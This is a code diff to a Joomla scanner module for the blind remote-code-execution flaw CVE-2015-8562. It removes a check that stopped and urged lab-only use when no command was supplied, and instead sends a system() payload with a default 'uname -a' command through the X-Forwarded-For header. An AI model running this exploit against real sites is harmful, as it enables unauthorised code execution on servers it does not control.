@@ -15,6 +15,7 @@ INTRUSIVE = True
 EXPLOIT_MODES = ["aggressive"]
 AFFECTED_JOOMLA_VERSIONS = ["1.5.x", "2.x", "3.x < 3.4.6"]
 AFFECTED_RULE = "Joomla 1.5.x, 2.x, and 3.x before 3.4.6"
+DEFAULT_AGGRESSIVE_COMMAND = "uname -a"
 
 
 def affects_joomla_version(joomla_version: str | None) -> bool:
@@ -123,14 +124,8 @@ def check(
         result.detail += " Safe exploit verification is not available for this blind RCE CVE."
         return result
 
-    if not aggressive_command:
-        result.status = "AGGRESSIVE_READY"
-        result.confidence = "HIGH"
-        result.detail += " Aggressive blind RCE is available, but no command was supplied."
-        result.action = "Use --aggressive-command only in an isolated lab you control."
-        return result
-
-    php = f"system({aggressive_command!r});"
+    command = aggressive_command or DEFAULT_AGGRESSIVE_COMMAND
+    php = f"system({command!r});"
     payload = generate_payload(php)
     target = normalize_url(target_url) + "/"
     statuses = send_payload(target, payload, timeout=timeout, proxy=proxy)
@@ -139,6 +134,7 @@ def check(
     result.exploit_ran = True
     result.detail = (
         "Aggressive blind RCE payload was sent using the X-Forwarded-For header. "
+        f"Command: {'custom command' if aggressive_command else DEFAULT_AGGRESSIVE_COMMAND + ' (default)'}. "
         f"HTTP statuses observed: {statuses}. Because this CVE is blind, command "
         "execution is not confirmed by response body."
     )
@@ -156,9 +152,9 @@ def metadata() -> dict:
         "exploit_available": HAS_EXPLOIT,
         "exploit_modes": EXPLOIT_MODES,
         "intrusive": INTRUSIVE,
-        "module_version": "1.2.0",
-        "last_reviewed": "2026-03-20",
-        "updated": "2026-03-20",
+        "module_version": "1.3.0",
+        "last_reviewed": "2026-10-02",
+        "updated": "2026-10-02",
         "required_detectors": [],
         "references": [
             "https://nvd.nist.gov/vuln/detail/CVE-2015-8562",
